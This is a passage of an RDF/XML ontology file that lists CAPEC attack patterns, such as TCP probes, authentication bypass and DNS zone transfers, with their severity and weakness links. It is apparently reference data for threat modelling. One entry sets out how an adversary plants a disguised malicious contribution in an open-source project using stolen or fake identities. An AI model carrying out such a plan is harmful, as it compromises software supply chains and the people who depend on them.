                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::732::648::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack244">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#204">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:167::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Lifting Sensitive Data Embedded in Cache"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::524::311::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack487">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#328">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:312::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#TCP &apos;RST&apos; Flag Checksum Probe"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack203">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#299">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:292::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#TCP SYN Ping"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack423">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#429">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:427::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Target Influence via Eye Cues"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack408">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#276">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:272::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Inter-component Protocol Manipulation"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::707::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack76">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#124">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Shared Data Manipulation"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack357">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#532">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:444::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Altered Installed BIOS"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack172">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#145">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:148::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Checksum Spoofing"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::354::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack44">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#202">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:22::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Create Malicious Client"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::602::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack71">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#306">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:300::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#TCP Window Scan"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <rdf:type rdf:resource="http://krstProj.com/capec#Severity"/>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack266">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#115">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Authentication Bypass"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::287::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack391">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#595">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:594::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Connection Reset"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::940::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack247">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#291">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:309::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#DNS Zone Transfers"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack486">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#320">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:312::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#TCP Timestamp Probe"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes>
                      <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Determine if timestamps are present.) The adversary sends a probe packet to the remote host to identify if timestamps are present.::STEP:2:PHASE:Experiment:DESCRIPTION:(Record and analyze timestamp values.) If the remote host is using timestamp  obtain several timestamps  analyze them and compare them to known values.TECHNIQUE:The adversary sends several requests and records the timestamp values.:TECHNIQUE:The adversary analyzes the timestamp values and determines an average increments per second in the timestamps for the target.:TECHNIQUE:The adversary compares this result to a database of known TCP timestamp increments for a possible match.::"/>
                    </j.0:executes>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack355">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#538">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:444::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Open Source Libraries Altered"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes>
                      <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Determine the relevent open-source code project to target) The adversary will make the selection based on various criteria: The open-source code currently in use on a selected target system. The depth in the dependency graph of the open source code in relationship to other code bases in use on the target system. Choosing an OSS lower in the graph decreases the probability of discovery  but also decreases the scope of its use within the target system. The programming language in which the open source code is implemented. Different languages present different opportunities for using known software weaknesses. The quality of processes in place to make a contribution. For instance  some contribution sites use static and dynamic analysis tools  which could increase the probability of discovery. The security requirments necessary to make a contribution. For instance  is the ownership lax allowing unsigned commits or anonymous users.::STEP:2:PHASE:Experiment:DESCRIPTION:(Develop a malicious contribution plan) The adversary develops a plan to contribute the malicious code  taking the following into consideration: The adversary will probably avoid easy-to-find software weaknesses  especially ones that static and dynamic analysis tools are likely to discover. Common coding errors or missing edge cases of the algorithm  which can be explained away as being accidental  if discovered  will be preferred by the adversary. Sometimes no identity is required to make a contribution. Other options are to steal an existing identity or create one. When creating a new identity strike a balance between too little or too much detail. Using an stolen identity could cause a notification to be sent to the actual user.::STEP:3:PHASE:Exploit:DESCRIPTION:(Execute the malicious contribution plan) Write the code to be contributed based on the plan and then submit the contribution. Multiple commits  possibly using multiple identities  will help obscure the attack. Monitor the contribution site to try to determine if the code has been uploaded to the target system.::"/>
                    </j.0:executes>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack323">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#144">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:150::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Detect Unpublicized Web Services"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack299">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#134">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:137::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Email Injection"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::150::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack45">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#544">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:194::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Counterfeit Organizations"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <rdf:type rdf:resource="http://krstProj.com/capec#Prerequisite"/>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack274">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#184">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Software Integrity Attack"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::494::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack264">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#620">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:212::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Drop Encryption Level"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::757::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Access ControlTECHNICAL IMPACT:Bypass Protection Mechanism::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack494">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#295">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:292::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Timestamp Request"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack206">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#545">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:116::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Pull Data from System Resources"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack489">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#321">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:312::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#TCP Sequence Number Probe"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack291">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#387">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:386::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Navigation Remapping To Propagate Malicious Content"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::471::345::346::602::311::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack430">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#428">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:427::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Influence via Modes of Thinking"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
